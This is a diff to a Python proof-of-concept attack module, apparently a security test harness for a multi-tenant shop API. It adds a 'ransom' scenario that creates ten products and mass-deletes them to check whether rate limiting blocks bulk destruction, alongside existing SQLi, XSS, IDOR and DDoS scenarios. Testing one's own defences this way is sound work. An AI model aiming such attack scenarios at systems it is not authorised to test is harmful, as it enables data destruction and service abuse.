@@ -207,12 +207,48 @@ def attack_ddos(base, admin_user, admin_pass):
         print(f"\n[RESULT] 🔴 VULNERABLE — 전부 통과(레이트리밋 없음).")
         return 1
 
+def attack_ransom(base, admin_user, admin_pass):
+    print("=== AIR PoC: Ransomware-유사 (대량 삭제 / mass-delete) ===")
+    admin_tok, _ = login(base, admin_user, admin_pass)
+    tid, _, _, _ = prepare(base, admin_tok)
+
+    # 삭제 대상 상품 N개 생성
+    n = 10
+    pids = []
+    for i in range(n):
+        st, j = call(base, 'POST', f'/api/v1/tenants/{tid}/products', admin_tok,
+                     {'name': f'doc-{i}', 'price': 1000, 'stock': 1})
+        pid = (j or {}).get('data', {}).get('id')
+        if pid:
+            pids.append(pid)
+    print(f"[*] 삭제 대상 상품 {len(pids)}개 생성")
+
+    # 빠르게 연속 삭제 (랜섬: 대량 파괴)
+    print(f"[>] {len(pids)}건 연속 DELETE")
+    codes = {}
+    deleted = blocked = 0
+    for pid in pids:
+        st, _ = call(base, 'DELETE', f'/api/v1/tenants/{tid}/products/{pid}', admin_tok)
+        codes[st] = codes.get(st, 0) + 1
+        if st in (200, 204):
+            deleted += 1
+        elif st in (429, 403):
+            blocked += 1
+    print(f"[<] 삭제 응답 분포: {codes}")
+
+    if blocked > 0:
+        print(f"\n[RESULT] 🟢 DEFENDED — {deleted}건 삭제 후 {blocked}건 차단(대량삭제 방어).")
+        return 0
+    else:
+        print(f"\n[RESULT] 🔴 VULNERABLE — {deleted}건 전부 삭제됨(무제한 대량 파괴).")
+        return 1
+
 def main():
     ap = argparse.ArgumentParser(description="AIR PoC 공격 모듈")
     ap.add_argument('--base', required=True, help='타깃 베이스 URL (예: http://13.125.184.233)')
     ap.add_argument('--admin-user', required=True)
     ap.add_argument('--admin-pass', required=True)
-    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss', 'idor', 'ddos'])
+    ap.add_argument('scenario', choices=['negative-qty', 'sqli', 'xss', 'idor', 'ddos', 'ransom'])
     a = ap.parse_args()
     if a.scenario == 'negative-qty':
         sys.exit(attack_negative_qty(a.base, a.admin_user, a.admin_pass))
@@ -224,6 +260,8 @@ def main():
         sys.exit(attack_idor(a.base, a.admin_user, a.admin_pass))
     elif a.scenario == 'ddos':
         sys.exit(attack_ddos(a.base, a.admin_user, a.admin_pass))
+    elif a.scenario == 'ransom':
+        sys.exit(attack_ransom(a.base, a.admin_user, a.admin_pass))
 
 if __name__ == '__main__':
     main()
